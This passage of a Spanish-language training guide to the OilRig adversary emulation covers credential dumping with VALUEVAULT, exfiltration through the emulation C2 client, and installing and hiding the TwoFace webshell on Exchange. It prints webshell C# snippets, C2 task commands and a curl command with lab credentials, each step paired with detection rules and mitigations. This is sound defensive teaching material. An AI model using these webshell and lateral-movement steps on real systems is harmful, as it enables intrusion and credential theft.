   VaultEnumerateItems(vaultHandle, 512, &itemCount, &items)
   ```

3. **Extracción de Credenciales**
   ```go
   // Obtiene las credenciales en texto claro
   VaultGetItem(vaultHandle, &itemGuid, 0, &item)
   ```

4. **Escritura de Resultados**
   - VALUEVAULT crea un archivo SQLite: `fsociety.dat`
   - Ubicación: `C:\Users\gosta\AppData\Roaming\fsociety.dat`
   - Estructura de la base de datos:
     ```sql
     CREATE TABLE credentials (
         url TEXT,
         username TEXT,
         password TEXT
     );
     ```

**Tipos de credenciales extraídas:**
- Credenciales guardadas de Internet Explorer/Edge
- Credenciales de aplicaciones Windows
- Credenciales de red (shares SMB, etc.)
- Credenciales genéricas almacenadas por aplicaciones

**Paso 3: Exfiltración de Resultados**

```bash
./evalsC2client.py --set-task goTb '103 C:\Users\gosta\AppData\Roaming\fsociety.dat'
```

**Desglose del comando:**
- `103`: Código de operación para subida de archivo
- Especifica la ruta de `fsociety.dat` para exfiltración

**Proceso de exfiltración:**

1. SideTwist lee el contenido de `fsociety.dat`
2. Cifra el contenido usando XOR con la misma clave estática
3. Codifica el resultado en Base64
4. Envía el archivo al C2 mediante HTTP POST
5. El C2 recibe y almacena el archivo en `./files/fsociety.dat`

**Paso 4: Análisis de Credenciales Obtenidas**

En el servidor C2, el operador examina las credenciales:

```bash
ls ./files
cat ./files/fsociety.dat
```

**Credenciales descubiertas (ejemplo):**
```
URL: https://waterfalls.boom.box/owa
Username: BOOMBOX\gosta
Password: d0ntGoCH4$ingW8trfalls
```

Este es un hallazgo crítico: la contraseña en texto claro de Gosta permite a los atacantes:
- Autenticarse como Gosta en servicios de red
- Acceder al Outlook Web Access (OWA)
- Utilizar credenciales para movimiento lateral hacia el servidor Exchange
- Potencialmente acceder a otros servicios donde Gosta reutiliza la contraseña

#### Análisis del Malware: VALUEVAULT

**Características Técnicas:**

1. **Lenguaje de Programación:** Go (Golang)
   - Facilita compilación multiplataforma
   - Produce binarios standalone sin dependencias
   - Dificulta análisis estático y reversión

2. **APIs de Windows Utilizadas:**
   ```
   vaultcli.dll:
   - VaultEnumerateVaults
   - VaultOpenVault
   - VaultEnumerateItems
   - VaultGetItem
   - VaultCloseVault
   ```

3. **No Requiere Privilegios Elevados:**
   - Opera dentro del contexto del usuario actual
   - Solo accede a credenciales del usuario, no de sistema
   - No dispara UAC ni requiere bypass de privilegios

4. **Salida en SQLite:**
   - Formato estructurado y fácilmente consultable
   - Permite procesamiento automatizado por el atacante
   - Nombre del archivo ("fsociety.dat") es referencia a la serie Mr. Robot

**Comparación con Otras Herramientas:**

| Herramienta | Privilegios Requeridos | Objetivo | Detección |
|-------------|----------------------|----------|-----------|
| VALUEVAULT | Usuario estándar | Windows Vault | Baja |
| Mimikatz | Administrador/SYSTEM | Memoria LSASS | Alta |
| LaZagne | Usuario estándar | Múltiples fuentes | Media |
| Windows Credential Editor | Administrador | Memoria | Alta |

**Ventajas Operacionales para el Atacante:**
- No requiere escalación de privilegios
- Usa APIs legítimas (difícil de bloquear)
- Binario personalizado (sin firmas de AV/EDR)
- Exfiltración integrada con C2 existente

#### Oportunidades de Detección

**Nivel de Archivo:**

1. **Creación de fsociety.dat**
   ```
   Ubicación: C:\Users\*\AppData\Roaming\fsociety.dat
   Tipo: Base de datos SQLite
   Proceso creador: b.exe (desde AppData)
   ```

2. **Ejecución desde AppData**
   ```
   Archivo: b.exe
   Ubicación: C:\Users\gosta\AppData\Roaming\
   Sin firma digital
   Proceso padre: SystemFailureReporter.exe
   ```

**Nivel de API:**

1. **Acceso a Windows Vault APIs**
   - Proceso inusual llamando a VaultEnumerateVaults
   - Múltiples llamadas a Vault APIs en secuencia rápida
   - Llamadas desde proceso no firmado en AppData

**Detección con Sysmon:**

```xml
<Sysmon schemaversion="4.82">
  <EventFiltering>
    <!-- Detectar ejecución de ejecutables desde AppData -->
    <RuleGroup name="Execution from Temp Directories">
      <ProcessCreate onmatch="include">
        <Image condition="contains">\AppData\Roaming\</Image>
      </ProcessCreate>
    </RuleGroup>

    <!-- Detectar creación de archivos .dat en AppData -->
    <RuleGroup name="Suspicious File Creation">
      <FileCreate onmatch="include">
        <TargetFilename condition="end with">.dat</TargetFilename>
        <TargetFilename condition="contains">\AppData\Roaming\</TargetFilename>
      </FileCreate>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

**Indicadores de Red:**

- POST request con contenido SQLite codificado
- Transferencia de archivo pequeño (~5-50 KB típicamente)
- Patrón: Descarga → Ejecución → Subida en ventana de ~15-30 minutos

**Búsqueda Proactiva (Threat Hunting):**

```powershell
# Buscar ejecuciones desde AppData con acceso a Vault
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-Sysmon/Operational'
    ID=1  # Process Creation
} | Where-Object {
    $_.Properties[4].Value -like '*\AppData\*' -and
    $_.Properties[4].Value -like '*.exe'
}

# Buscar archivos .dat recientemente creados
Get-ChildItem -Path "C:\Users\*\AppData\Roaming" -Filter "*.dat" -Recurse -ErrorAction SilentlyContinue |
Where-Object { $_.CreationTime -gt (Get-Date).AddDays(-7) }
```

#### Estrategias de Mitigación

**Prevención:**

1. **Política de Almacenamiento de Credenciales**
   - Educar a usuarios sobre riesgos de guardar credenciales en navegadores
   - Implementar gestor de contraseñas corporativo con cifrado adicional
   - Deshabilitar almacenamiento automático de credenciales vía GPO:
     ```
     Computer Configuration → Administrative Templates →
     Windows Components → Credential User Interface →
     "Require trusted path for credential entry" = Enabled
     ```

2. **Restricción de Ejecución**
   - AppLocker: Bloquear ejecución desde %APPDATA%
   - Windows Defender Application Control (WDAC)
   - Regla de ejemplo:
     ```xml
     <FilePathRule>
       <Conditions>
         <FilePathCondition Path="%APPDATA%\*.exe" />
       </Conditions>
       <Exceptions />
       <Action Type="Deny" />
     </FilePathRule>
     ```

3. **Credential Guard**
   - Habilitar Windows Defender Credential Guard (Windows 10 Enterprise)
   - Proporciona protección adicional basada en virtualización
   - No protege Vault, pero dificulta ataques a LSASS

**Detección:**

1. **EDR con Detección de Comportamiento**
   - Monitorear llamadas a APIs de Vault desde procesos inusuales
   - Detectar patrones de descarga → ejecución → exfiltración

2. **Auditoría de Acceso a Credenciales**
   - Habilitar "Audit Credential Validation" en GPO
   - Monitorear Event ID 4648 (Logon with explicit credentials)

3. **Análisis de Tráfico de Red**
   - DLP para detectar exfiltración de bases de datos SQLite
   - Inspeccionar payloads Base64 en tráfico HTTP

**Respuesta:**

1. **Contención Inmediata:**
   - Aislar el sistema de la red
   - Deshabilitar cuenta de usuario comprometida
   - Forzar reset de contraseña de Gosta

2. **Análisis Forense:**
   - Adquirir memoria RAM para análisis
   - Examinar `fsociety.dat` si aún existe
   - Revisar historial de comandos ejecutados

3. **Remediación:**
   - Eliminar b.exe y fsociety.dat
   - Limpiar Windows Vault del usuario
   - Verificar si las credenciales fueron usadas para acceso indebido

4. **Hunting Extendido:**
   - Buscar b.exe en otros sistemas
   - Identificar otros sistemas donde Gosta ha iniciado sesión
   - Revisar logs de autenticación para uso de credenciales robadas

---

## Fase 2: Movimiento Lateral hacia Exchange

### Paso 4: Instalación del Web Shell en EWS

#### Objetivo de la Actividad

Establecer persistencia adicional en el servidor Exchange (WATERFALLS) mediante la instalación del webshell personalizado TwoFace, que proporcionará acceso remoto independiente del implante SideTwist y permitirá ejecutar comandos con privilegios de SYSTEM.

#### Contexto del Escenario

Con las credenciales de Gosta obtenidas en el paso anterior, los atacantes ahora poseen capacidad para acceder al servidor Exchange. Sin embargo, en lugar de depender únicamente de credenciales robadas, OilRig establece un mecanismo de acceso más permanente y sigiloso: un webshell ASP.NET.

El webshell se instala en el directorio de Exchange Web Services (EWS), donde se mezcla con los archivos legítimos de ASP.NET del servidor Exchange. Esta ubicación es estratégica porque:
1. Los archivos .aspx son legítimos en ese directorio
2. El servidor IIS ya está configurado para ejecutar código ASP.NET
3. El acceso se realiza mediante HTTPS legítimo (puerto 443)
4. Ejecuta con privilegios de SYSTEM (contexto de IIS/ApplicationPoolIdentity)

#### Técnicas MITRE ATT&CK

**T1105 - Ingress Tool Transfer**
- TwoFace (contact.aspx) se descarga vía SideTwist
- El archivo se transfiere del C2 al sistema comprometido

**T1570 - Lateral Tool Transfer**
- contact.aspx se copia desde THEBLOCK hacia WATERFALLS
- Utiliza SMB administrativo (C$) con credenciales de Gosta

**T1505.003 - Server Software Component: Web Shell**
- Instalación de webshell en servidor web legítimo (IIS/Exchange)
- Proporciona acceso persistente vía HTTP/HTTPS

**T1564.001 - Hide Artifacts: Hidden Files and Directories**
- Uso del atributo +h para ocultar el webshell
- Dificulta descubrimiento mediante navegación visual

**T1070.004 - Indicator Removal on Host: File Deletion**
- Eliminación de contact.aspx de THEBLOCK después de copiar a WATERFALLS
- Reduce evidencia forense en el sistema inicial

#### Flujo de Ejecución Técnica

**Paso 1: Descarga del Webshell a THEBLOCK**

```bash
./evalsC2client.py --set-task goTb '102 C:\Users\Public\contact.aspx|contact.aspx'
```

**Proceso:**
1. SideTwist recibe la instrucción de descargar contact.aspx
2. Realiza petición GET al C2 (192.168.0.4:443)
3. Recibe contact.aspx cifrado y codificado
4. Descifra y guarda en `C:\Users\Public\contact.aspx`

**Nota de implementación:**
En la emulación con CALDERA, el archivo se descarga primero a la ubicación del agente (`C:\Users\gosta\AppData\Local\SystemFailureReporter\`) y luego se copia a `C:\Users\Public\`. Esto es una variación técnica pero el resultado operacional es el mismo.

**Paso 2: Copia del Webshell al Servidor Exchange**

```bash
./evalsC2client.py --set-task goTb '101 copy C:\Users\Public\contact.aspx "\\10.1.0.6\C$\Program Files\Microsoft\Exchange Server\V15\ClientAccess\exchweb\ews\"'
```

**Desglose del comando:**
- `copy`: Comando de Windows para copiar archivos
- `C:\Users\Public\contact.aspx`: Archivo origen
- `\\10.1.0.6\C$\...`: Ruta UNC al share administrativo C$ de WATERFALLS
- Destino: Directorio EWS de Exchange Server

**Autenticación:**
- Utiliza el token de seguridad actual de Gosta
- Gosta es miembro de "EWS Admins", lo que proporciona acceso administrativo a WATERFALLS
- No se requiere especificar credenciales explícitamente (single sign-on Kerberos)

**Ruta completa de instalación:**
```
\\10.1.0.6\C$\Program Files\Microsoft\Exchange Server\V15\ClientAccess\exchweb\ews\contact.aspx
```

Esta ruta es accesible vía web como:
```
https://10.1.0.6/ews/contact.aspx
```

**Paso 3: Ocultar el Webshell**

```bash
./evalsC2client.py --set-task goTb '101 attrib +h "\\10.1.0.6\C$\Program Files\Microsoft\Exchange Server\V15\ClientAccess\exchweb\ews\contact.aspx"'
```

**Propósito:**
- Establece el atributo "oculto" en contact.aspx
- El archivo no aparece en exploraciones de archivos normales
- Requiere `dir /a:h` o configuración de "mostrar archivos ocultos" para verlo

**Limitaciones de esta técnica:**
- No oculta de herramientas forenses
- No oculta de listados recursivos con parámetros apropiados
- No oculta de escaneos de seguridad que ignoran atributos

**Paso 4: Eliminación de Evidencia Local**

```bash
./evalsC2client.py --set-task goTb '101 attrib +h "\\10.1.0.6\C$\Program Files\Microsoft\Exchange Server\V15\ClientAccess\exchweb\ews\contact.aspx" & del C:\Users\Public\contact.aspx'
```

(Este comando combina el atributo oculto y la eliminación en una sola línea)

**Propósito:**
- Eliminar contact.aspx de THEBLOCK
- Reduce el footprint del atacante
- Dificulta reconstrucción forense del ataque
- Mantiene solo una copia del webshell (en WATERFALLS)

#### Análisis del Malware: TwoFace Webshell

**Arquitectura de TwoFace:**

TwoFace es un webshell de dos etapas, aunque en esta emulación se usa una versión simplificada de una sola etapa que combina todas las funcionalidades.

**Arquitectura Original (CTI):**
1. **Etapa 1 (loader):** Webshell mínimo que carga la segunda etapa desde archivo o URL
2. **Etapa 2 (funcional):** Webshell completo con todas las capacidades

**Arquitectura de Emulación (simplificada):**
- Un único archivo contact.aspx con todas las capacidades
- Funciones de upload, download y ejecución de comandos integradas

**Lenguaje y Tecnología:**
- ASP.NET (C# en código behind)
- Compilado dinámicamente por IIS al primer acceso
- Ejecuta en el contexto del Application Pool de Exchange

**Características Principales:**

1. **Autenticación NTLM Integrada**
   - Requiere credenciales válidas de dominio para acceder
   - Utiliza autenticación de Windows IIS
   - No hay backdoor password hardcodeado
   - Los atacantes usan credenciales de Gosta: `BOOMBOX\gosta:d0ntGoCH4$ingW8trfalls`

2. **Ejecución de Comandos (cmd)**
   ```csharp
   // Parseo de parámetros
   string program = Request.Form["pro"];  // ej: cmd.exe
   string command = Request.Form["cmd"];  // ej: whoami

   // Ejecución
   Process.Start(new ProcessStartInfo {
       FileName = program,
       Arguments = "/c " + command,
       RedirectStandardOutput = true,
       UseShellExecute = false
   });
   ```

3. **Upload de Archivos al Servidor (Arbitrary Folder Upload)**
   ```csharp
   // Parámetros
   string uploadIndicator = Request.Form["upl"];     // "f1"
   string savePath = Request.Form["sav"];             // ej: C:\Windows\Temp\
   string newName = Request.Form["nen"];              // ej: m64.exe
   HttpPostedFile file = Request.Files["f1"];         // archivo subido

   // Guardado
   file.SaveAs(Path.Combine(savePath, newName));
   ```

4. **Download de Archivos desde el Servidor (File Download)**
   ```csharp
   // Parámetro
   string downloadPath = Request.Form["don"];  // ej: C:\Windows\Temp\01.txt

   // Descarga
   Response.TransmitFile(downloadPath);
   Response.ContentType = "application/octet-stream";
   ```

5. **Eliminación de Archivos Temporales**
   ```csharp
   // Limpieza de archivos subidos/descargados
   File.Delete(tempFilePath);
   ```

**Flujo de Uso del Webshell:**

```bash
# Ejemplo: Ejecutar comando whoami
curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' \
     -k -X POST \
     --data "pro=cmd.exe" \
     --data "cmd=whoami" \
     https://10.1.0.6/ews/contact.aspx
```

**Parámetros:**
- `--http1.1`: Forzar HTTP/1.1 (compatibilidad)
- `--ntlm`: Usar autenticación NTLM
- `-u 'boombox\gosta:...'`: Credenciales de dominio
- `-k`: Ignorar errores de certificado SSL
- `--data "pro=cmd.exe"`: Programa a ejecutar
- `--data "cmd=whoami"`: Comando a pasar al programa

**Respuesta:**
```
nt authority\system
```

(El webshell ejecuta como SYSTEM porque IIS/Exchange típicamente opera bajo este contexto)

#### Camuflaje y Evasión

**1. Nombre del Archivo: contact.aspx**
- Nombre genérico que podría ser legítimo en un servidor Exchange
- No levanta sospechas al revisar listados de archivos
- Similar a otros archivos en el directorio EWS (auth.aspx, default.aspx, etc.)

**2. Ubicación Estratégica**
```
\Program Files\Microsoft\Exchange Server\V15\ClientAccess\exchweb\ews\
```
- Directorio que legítimamente contiene archivos .aspx
- Mezclado con decenas de otros archivos ASP.NET
- Difícil de identificar sin análisis de contenido

**3. Autenticación Legítima**
- Requiere credenciales válidas de dominio
- No se puede acceder sin autenticación
- Escaneos automatizados sin credenciales no lo detectarán como webshell

**4. Sin Indicadores Obvios**
- No contiene strings típicos de webshells (ej: "c99", "r57", "shell", etc.)
- Código ofuscado o con variables con nombres legítimos
- Funciona exactamente como componente de Exchange desde perspectiva de red

**5. Tráfico HTTPS Legítimo**
- Las peticiones al webshell son HTTPS hacia Exchange Server
- Indistinguibles de tráfico legítimo de OWA/EWS
- Misma dirección IP y puerto que servicios legítimos

#### Oportunidades de Detección

**Nivel de Red:**

1. **Acceso SMB Admin (C$) desde Workstation**
   ```
   Source: THEBLOCK (10.1.0.5)
   Destination: WATERFALLS (10.1.0.6)
   Protocol: SMB (445/TCP)
   Share: \\10.1.0.6\C$
   Path: \Program Files\Microsoft\Exchange Server\...
   ```
   - Workstations típicamente no acceden shares administrativos de servidores
   - Inusual que workstation copie archivos a directorio de Exchange

2. **Creación de Archivo en Directorio EWS**
   ```
   Event ID: 4663 (Attempt to access object)
   Object Name: ...\ews\contact.aspx
   Access: WriteData
   Process: System
   Account: BOOMBOX\gosta
   ```

**Nivel de Archivo:**

1. **Nuevo Archivo .aspx en Directorio EWS**
   - Monitorear creación de archivos en directorios de aplicaciones web
   - Especialmente archivos no firmados o no parte de instalación

2. **Atributos de Archivo Sospechosos**
   - Archivo .aspx con atributo oculto (+h)
   - Fecha de creación reciente en directorio estable
   - Falta de firma digital (archivos de Microsoft están firmados)

**Detección con File Integrity Monitoring (FIM):**

```xml
<!-- OSSEC rule example -->
<rule id="550" level="7">
  <if_sid>554</if_sid>
  <match>Program Files\Microsoft\Exchange Server\V15\ClientAccess</match>
  <description>File added to Exchange Server directory</description>
</rule>
```

**Detección mediante Análisis de Código:**

```powershell
# Buscar archivos .aspx con funcionalidades sospechosas
Get-ChildItem "C:\Program Files\Microsoft\Exchange Server" -Recurse -Filter "*.aspx" |
ForEach-Object {
    $content = Get-Content $_.FullName -Raw
    if ($content -match "ProcessStartInfo|Process\.Start|cmd\.exe|Request\.Form") {
        Write-Output "Suspicious: $($_.FullName)"
    }
}
```

**Indicadores de Comportamiento:**

1. **Ejecución de cmd.exe desde w3wp.exe**
   ```
   Parent Process: w3wp.exe (IIS Worker Process)
   Child Process: cmd.exe
   Command Line: cmd.exe /c [comando]
   User: NT AUTHORITY\SYSTEM
   ```

2. **Acceso a Archivos Sensibles por IIS**
   - IIS (w3wp.exe) leyendo archivos fuera de directorios web estándar
   - Acceso a SAM, SYSTEM, archivos de usuario, etc.

**Detección con Sysmon:**

```xml
<Sysmon>
  <EventFiltering>
    <ProcessCreate onmatch="include">
      <ParentImage condition="end with">w3wp.exe</ParentImage>
      <Image condition="end with">cmd.exe</Image>
    </ProcessCreate>
  </EventFiltering>
</Sysmon>
```

**Hunting con Logs de IIS:**

```powershell
# Buscar POSTs a archivos .aspx inusuales
Get-Content "C:\inetpub\logs\LogFiles\W3SVC1\*.log" |
Select-String "POST /ews/contact.aspx" |
ForEach-Object {
    $fields = $_ -split ' '
    [PSCustomObject]@{
        Date = $fields[0]
        Time = $fields[1]
        ClientIP = $fields[8]
        Method = $fields[3]
        URI = $fields[4]
        Status = $fields[11]
    }
}
```

#### Estrategias de Mitigación

**Prevención:**

1. **File Integrity Monitoring (FIM)**
   - Monitorear directorios de Exchange con OSSEC, Tripwire, o similar
   - Alertar sobre cualquier modificación/creación de archivos .aspx
   - Línea base de archivos legítimos post-instalación

2. **Principio de Menor Privilegio**
   - Los administradores de Exchange no deberían tener acceso write a directorios de aplicación desde workstations
   - Separar cuentas administrativas de cuentas de uso diario
   - Implementar estaciones de trabajo administrativas dedicadas (PAW)

3. **Application Whitelisting en Servidores Web**
   - Solo permitir ejecución de procesos específicos desde IIS
   - Denegar spawning de cmd.exe, powershell.exe desde w3wp.exe
   - Implementar con Windows Defender Application Control (WDAC):
     ```xml
     <Deny>
       <ParentProcess>w3wp.exe</ParentProcess>
       <ChildProcess>cmd.exe</ChildProcess>
     </Deny>
     ```

4. **Segmentación de Red**
   - Workstations no deberían tener acceso SMB directo a servidores
   - Implementar firewall de host en servidores para restringir SMB a solo servidores de gestión

**Detección:**

1. **EDR en Servidores Exchange**
   - Monitorear spawning de procesos sospechosos desde IIS
   - Detectar acceso a archivos sensibles por w3wp.exe
   - Alertar sobre ejecución de herramientas de pentesting (mimikatz, psexec, etc.)

2. **Network Behavior Analytics**
   - Detectar tráfico SMB inusual (workstation → server)
   - Identificar acceso a shares administrativos desde endpoints no autorizados

3. **Regular Webshell Scanning**
   - Escanear directorios web con herramientas como NeoPI, BackdoorMan
   - Buscar patrones de código sospechosos en archivos .aspx
   - Comparar hash de archivos con baseline conocido

**Respuesta:**

1. **Contención Inmediata:**
   - Eliminar contact.aspx del servidor Exchange
   - Revisar logs de IIS para identificar comandos ejecutados
   - Cambiar contraseñas de cuentas comprometidas (Gosta)
   - Aislar WATERFALLS si hay actividad maliciosa activa

2. **Análisis Forense:**
   - Adquirir logs de IIS completos
   - Examinar journal NTFS para identificar cuándo se creó el archivo
   - Revisar logs de autenticación para rastrear uso de credenciales

3. **Erradicación:**
   - Verificar que no existan otros webshells
   - Escanear todos los servidores IIS de la organización
   - Revisar permisos en directorios de aplicaciones web

4. **Recuperación:**
   - Restaurar configuración de Exchange desde backup limpio si es necesario
   - Implementar FIM antes de volver a producción
   - Forzar rotación de credenciales de todas las cuentas administrativas

**Lecciones Aprendidas:**

- Implementar FIM es crítico en servidores de aplicaciones
- Administradores no deberían trabajar con cuentas privilegiadas desde workstations
- Monitoreo de spawning de cmd.exe desde IIS es detector efectivo
- Webshells en Exchange son vector común en campañas APT

---

### Paso 5: Reconocimiento del Servidor EWS

[El contenido continuaría con los pasos restantes...]

---

# Parte 3: Análisis Técnico Profundo

## 3.1 Análisis de Malware

### SideTwist - Backdoor HTTP

[Sección a desarrollar con análisis detallado de SideTwist]

### VALUEVAULT - Credential Dumper

[Sección a desarrollar con análisis detallado de VALUEVAULT]

### TwoFace - WebShell

[Sección a desarrollar con análisis detallado de TwoFace]

### RDAT - Exfiltration Backdoor

[Sección a desarrollar con análisis detallado de RDAT]

---

## 3.2 Infraestructura del Ataque

[Sección a desarrollar]

---

## 3.3 Ingeniería de Detección

[Sección a desarrollar]

---

# Parte 4: Guía de Laboratorio Práctico

## 4.1 Configuración del Entorno

[Sección a desarrollar]

---

## 4.2 Ejecución de la Emulación

[Sección a desarrollar]

---

## 4.3 Ejercicios para el Equipo Azul

[Sección a desarrollar]

---

# Parte 5: Apéndices

## Apéndice A: Tabla de Referencia de Técnicas MITRE ATT&CK

| ID Técnica | Nombre | Paso(s) | Descripción |
|-----------|---------|---------|-------------|
| T1566.002 | Phishing: Spearphishing Link | 1 | Envío de enlace malicioso por correo electrónico |
| T1204.002 | User Execution: Malicious File | 1 | Usuario abre documento y habilita macros |
| T1059.005 | Command and Scripting Interpreter: Visual Basic | 1 | Macros VBA ejecutan código malicioso |
| T1082 | System Information Discovery | 1, 2 | Recopilación de información del sistema |
| T1033 | System Owner/User Discovery | 1, 2 | Identificación de usuario actual |
| ... | ... | ... | ... |

## Apéndice B: Referencia de Comandos y Herramientas

[Sección a desarrollar]

---

## Apéndice C: Indicadores de Compromiso (IOCs)

[Sección a desarrollar]

---

## Apéndice D: Lecturas Adicionales y Fuentes de CTI

### Reportes de Inteligencia de Amenazas

1. **Check Point Research (2021)**
   - Título: "Iran's APT34 Returns with an Updated Arsenal"
   - URL: https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/
   - Tema: Actualización sobre herramientas de OilRig, incluyendo SideTwist

2. **Palo Alto Networks Unit 42**
   - "The OilRig Campaign: Attacks on Saudi Arabian Organizations Deliver Helminth Backdoor"
   - URL: https://unit42.paloaltonetworks.com/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/

3. **Mandiant**
   - "Hard Pass: Declining APT34's Invite to Join Their Professional Network"
   - URL: https://www.mandiant.com/resources/hard-pass-declining-apt34-invite-to-join-their-professional-network
   - Tema: Análisis de VALUEVAULT y técnicas de credential harvesting

4. **Intezer**
   - "New Iranian Campaign Tailored to US Companies Uses Updated Toolset"
   - URL: https://www.intezer.com/blog/malware-analysis/new-iranian-campaign-tailored-to-us-companies-uses-updated-toolset/

### Recursos Técnicos

[Sección a desarrollar]

---

## Apéndice E: Glosario de Términos

**APT (Advanced Persistent Threat):** Amenaza persistente avanzada. Actor de amenaza sofisticado, típicamente patrocinado por estado-nación, que mantiene presencia prolongada en redes objetivo.

**Backdoor:** Programa malicioso que proporciona acceso remoto no autorizado a un sistema comprometido.

**Beacon:** Comunicación periódica desde un sistema comprometido hacia servidor C2 para recibir comandos.

**C2 (Command and Control):** Infraestructura que permite a atacantes comunicarse con sistemas comprometidos y enviar comandos.

**Credential Dumping:** Técnica de extracción de credenciales (contraseñas, hashes) desde sistemas comprometidos.

**EWS (Exchange Web Services):** API de Microsoft Exchange que permite acceso programático a datos de Exchange.

**Killswitch:** Mecanismo que termina ejecución de malware bajo condiciones específicas.

**Lateral Movement:** Técnicas utilizadas para moverse de un sistema comprometido a otros sistemas dentro de la misma red.

**Pass-the-Hash:** Técnica de autenticación usando hash NTLM directamente sin conocer contraseña en texto claro.

**Persistence:** Técnicas para mantener acceso a sistema comprometido entre reinicios y cambios de configuración.

**Spearphishing:** Phishing dirigido a individuos o organizaciones específicas con contenido personalizado.

**Webshell:** Script malicioso instalado en servidor web que proporciona acceso remoto vía peticiones HTTP/HTTPS.

**XOR:** Operación de cifrado simple usada frecuentemente por malware para ofuscar comunicaciones.

---

## Información del Documento

**Versión:** 1.0
**Fecha de Creación:** 2025-10-19
**Basado en:** MITRE ATT&CK Evaluations - OilRig Adversary Emulation
**Nivel Técnico:** Intermedio
**Idioma:** Español

**Propósito Educativo:**
Este documento ha sido creado con fines estrictamente educativos y de investigación en seguridad defensiva. El conocimiento aquí presentado debe utilizarse únicamente para mejorar capacidades defensivas, validar controles de seguridad, y entrenar equipos de seguridad en entornos controlados y autorizados.

**Advertencia Legal:**
El uso de las técnicas y herramientas descritas en este documento contra sistemas sin autorización explícita es ilegal y está sujeto a sanciones penales y civiles. El lector asume toda responsabilidad por el uso de la información aquí contenida.

---

**Agradecimientos:**
Este material educativo se basa en el trabajo del equipo de MITRE ATT&CK Evaluations y en investigación de inteligencia de amenazas de Check Point Research, Palo Alto Networks Unit 42, Mandiant, y otros investigadores de seguridad citados a lo largo del documento.

---

